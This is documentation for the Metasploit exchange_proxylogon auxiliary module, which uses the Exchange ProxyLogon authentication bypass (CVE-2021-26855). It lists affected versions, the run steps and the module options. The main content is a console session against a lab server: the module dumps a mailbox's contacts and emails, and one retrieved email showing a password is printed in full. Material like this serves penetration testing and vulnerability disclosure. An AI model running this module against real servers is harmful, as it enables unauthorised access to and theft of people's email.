## Vulnerable Application

  This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013,
  Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

### Introduction

  An issue was discovered in Microsoft Exchange Server that allows an attacker bypassing the authentication and
  impersonating as the admin (CVE-2021-26855). By chaining this bug with another post-auth arbitrary-file-write
  vulnerability to get code execution (CVE-2021-27065).

  As a result, an unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server.

  All components are vulnerable by default.

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/gather/exchange_proxylogon`
3. Do: `set RHOSTS [IP]`
4. Do: `set EMAIL [EMAIL ADDRESS]`
5. Do: `set SERVER_NAME [SERVER_NAME]`
6. Do: `run`

## Options
1. `EMAIL`. The email account what you want dump
2. `FOLDER`. The email folder what you want dump. Default: `inbox`
3. `Proxies`. This option is not set by default.
4. `RPORT`. The default setting is `443`. To use: `set RPORT [PORT]`
5. `SERVER_NAME`. The name of secondary internal Exchange server targeted.
6. `SSL`. The default setting is `true`.
7. `VHOST`. This option is not set by default.

## Scenarios

```
msf6 auxiliary(gather/exchange_proxylogon) > options 

Module options (auxiliary/gather/exchange_proxylogon):

   Name         Current Setting           Required  Description
   ----         ---------------           --------  -----------
   EMAIL        gaston.lagaffe@pwned.lab  yes       The email account what you want dump
   FOLDER       inbox                     yes       The email folder what you want dump
   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       172.20.2.110              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        443                       yes       The target port (TCP)
   SERVER_NAME  SERVER2                   yes       The name of the Exchange server targeted
   SSL          true                      no        Negotiate SSL/TLS for outgoing connections
   VHOST                                  no        HTTP server virtual host

msf6 auxiliary(gather/exchange_proxylogon) > run
[*] Running module against 172.20.2.110

[*] Connection to the server is successful
[*]  - selected account: gaston.lagaffe@pwned.lab

[*] Attempt to dump contacts list for this user
[+]  - file saved to /home/mekhalleh/.msf4/loot/20210309225141_default_172.20.2.110__852485.txt

[*] Attempt to dump emails for this user
[*]  - selected folder: inbox (AQAYAGdhc3Rvbi5sYWdhZmYAZUBwd25lZC5sYWIALgAAA+uQmQIqiSJLiXyYWVYT65MBACRuvwACXEpAuhG13iUjVgwAAAIBDAAAAA==)
[*]  - number of email found: 2
[*]  - download item: CQAAABYAAAAkbr8AAlxKQLoRtd4lI1YMAAAAAAEc
[+]  - file saved to /home/mekhalleh/.msf4/loot/20210309225141_default_172.20.2.110__150371.txt
[*]  - download item: CQAAABYAAAAkbr8AAlxKQLoRtd4lI1YMAAAAAAEX
[+]  - file saved to /home/mekhalleh/.msf4/loot/20210309225141_default_172.20.2.110__662077.txt
[*] Auxiliary module execution completed
msf6 auxiliary(gather/exchange_proxylogon) > cat /home/mekhalleh/.msf4/loot/20210309225141_default_172.20.2.110__662077.txt
[*] exec: cat /home/mekhalleh/.msf4/loot/20210309225141_default_172.20.2.110__662077.txt

Received: from exch2k16.pwned.lab (172.20.2.110) by exch2k16.pwned.lab
 (172.20.2.110) with Microsoft SMTP Server (TLS) id 15.1.225.42 via Mailbox
 Transport; Tue, 9 Mar 2021 00:45:07 +0400
Received: from exch2k16.pwned.lab (172.20.2.110) by exch2k16.pwned.lab
 (172.20.2.110) with Microsoft SMTP Server (TLS) id 15.1.225.42; Tue, 9 Mar
 2021 00:45:07 +0400
Received: from exch2k16.pwned.lab ([fe80::149f:ecd5:e73f:a1da]) by
 exch2k16.pwned.lab ([fe80::149f:ecd5:e73f:a1da%12]) with mapi id
 15.01.0225.041; Tue, 9 Mar 2021 00:45:07 +0400
From: Gaston LAGAFFE <gaston.lagaffe@pwned.lab>
To: Gaston LAGAFFE <gaston.lagaffe@pwned.lab>
Subject: You strong password
Thread-Topic: You strong password
Thread-Index: AQHXFFvsra30q8OYg0uREmmfQA0DOg==
Date: Mon, 8 Mar 2021 20:45:07 +0000
Message-ID: <a866c18d2f5845ceb96574e7a33553b8@pwned.lab>
Accept-Language: fr-FR, en-US
Content-Language: fr-FR
X-MS-Exchange-Organization-AuthAs: Internal
X-MS-Exchange-Organization-AuthMechanism: 04
X-MS-Exchange-Organization-AuthSource: exch2k16.pwned.lab
X-MS-Has-Attach:
X-MS-Exchange-Organization-Network-Message-Id:
	b6335683-ea6f-4115-edb7-08d8e2730ef3
X-MS-Exchange-Organization-SCL: -1
X-MS-TNEF-Correlator:
Content-Type: multipart/alternative;
	boundary="_000_a866c18d2f5845ceb96574e7a33553b8pwnedlab_"
MIME-Version: 1.0

--_000_a866c18d2f5845ceb96574e7a33553b8pwnedlab_
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

Hello Gaston,


Your password is: P@ssw0rd123


Kind Regards.

Admin.

--_000_a866c18d2f5845ceb96574e7a33553b8pwnedlab_
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html>
<head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
1">
<style type=3D"text/css" style=3D"display:none;"><!-- P {margin-top:0;margi=
n-bottom:0;} --></style>
</head>
<body dir=3D"ltr">
<div id=3D"divtagdefaultwrapper" style=3D"font-size:12pt;color:#000000;back=
ground-color:#FFFFFF;font-family:Calibri,Arial,Helvetica,sans-serif;">
<p>Hello Gaston,</p>
<p><br>
</p>
<p>Your password is: P@ssw0rd123</p>
<p><br>
</p>
<p>Kind Regards.</p>
<p>Admin.</p>
</div>
</body>
</html>

--_000_a866c18d2f5845ceb96574e7a33553b8pwnedlab_--
msf6 auxiliary(gather/exchange_proxylogon) > 
```

## References

1. <https://proxylogon.com/>
2. <https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse>
